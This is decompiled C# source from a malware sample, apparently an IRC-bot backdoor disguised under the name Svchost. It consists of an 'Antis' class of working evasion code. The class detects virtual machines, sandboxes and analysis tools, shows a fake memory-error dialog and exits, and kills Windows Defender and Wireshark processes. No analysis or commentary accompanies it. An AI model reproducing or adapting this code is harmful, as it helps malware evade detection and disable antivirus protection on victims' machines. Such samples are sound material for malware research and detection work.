// Decompiled with JetBrains decompiler
// Type: myApp.Antis
// Assembly: Svchost, Version=1.0.3797.25400, Culture=neutral, PublicKeyToken=null
// MVID: E157A03A-FE69-4E7B-AD46-73B5B6218564
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.MSIL.IrcBot.fy-ac791d112cad6f2a883c24cb5a554f1a826fa0afc8bb0e0be6dada5ff2c5a16d.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace myApp
{
  internal class Antis
  {
    public static void Verif()
    {
      if (Antis.AVPC())
        Antis.iSdbg();
      else if (Antis.AA1())
        Antis.iSdbg();
      else if (Antis.AA12())
        Antis.iSdbg();
      else if (Antis.AS())
        Antis.iSdbg();
      else if (Antis.AVB())
        Antis.iSdbg();
      else if (Antis.ASB())
        Antis.iSdbg();
      else if (Antis.ATE())
        Antis.iSdbg();
      Antis.AntiWinDef1();
      Antis.AntiWinDef2();
      Antis.AntiWireShark();
    }

    private static void iSdbg()
    {
      int num = (int) MessageBox.Show("Application Error: The instruction at \"0x7883b4\" referenced memory at \"0x004467\". The memory could not be \"read\".", "Critical Error!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      Environment.Exit(0);
    }

    private static bool AVB() => Antis.prcIsRunning("VBoxService");

    private static bool ASB() => Directory.Exists("C:\\analysis");

    private static void AntiWireShark()
    {
      if (!Antis.prcIsRunning("wireshark"))
        return;
      Antis.killProcess("wireshark");
    }

    private static void AntiWinDef1()
    {
      if (!Antis.prcIsRunning("MSASCui"))
        return;
      Antis.killProcess("MSASCui");
    }

    private static void AntiWinDef2()
    {
      if (!Antis.prcIsRunning("msmpeng"))
        return;
      Antis.killProcess("msmpeng");
    }

    private static bool AS() => Process.GetProcessesByName("SbieSvc").Length >= 1 | Process.GetProcessesByName("sniff_hit").Length >= 1 | Process.GetProcessesByName("sysAnalyzer").Length >= 1;

    private static bool AA1() => Application.ExecutablePath == Application.StartupPath + "\\sample.exe";

    private static bool ATE() => Process.GetCurrentProcess().MainModule.FileName.Contains("sample");

    private static bool AA12() => (string) Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", false).GetValue("ProductId") == "76487-337-8429955-22614";

    private static bool AVPC() => Process.GetProcessesByName("vpcmap").Length >= 4 & Process.GetProcessesByName("vmsrvc").Length >= 4 || Process.GetProcessesByName("vmusrvc").Length >= 4;

    public static bool prcIsRunning(string process)
    {
      foreach (Process process1 in Process.GetProcesses())
      {
        if (process1.ProcessName.Contains(process))
          return true;
      }
      return false;
    }

    public static void killProcess(string process)
    {
      foreach (Process process1 in Process.GetProcesses())
      {
        if (process1.ProcessName.Contains(process))
        {
          try
          {
            process1.Kill();
          }
          catch
          {
          }
        }
      }
    }
  }
}
